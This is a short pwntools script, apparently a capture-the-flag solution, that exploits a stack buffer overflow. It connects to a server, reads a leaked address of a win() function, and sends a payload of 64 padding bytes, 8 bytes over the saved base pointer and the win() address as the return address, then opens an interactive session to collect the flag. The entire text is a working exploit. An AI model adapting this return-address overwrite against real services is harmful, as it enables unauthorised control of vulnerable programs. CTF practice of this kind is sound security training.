from pwn import *

# Connect to the server
p = remote("localhost", 12345) #make sure to get the server ip instead of localhost

# Leak the address of win()
p.recvuntil("Address of win(): ")
win_addr = int(p.recvline().strip(), 16)
log.info(f"Address of win(): {hex(win_addr)}")

# Craft the payload
payload = b"A" * 64          # Fill the buffer
payload += b"B" * 8           # Overwrite saved base pointer
payload += p64(win_addr)      # Overwrite return address with win() address

# Send the payload
p.sendline(payload)

# Receive the flag
p.interactive()

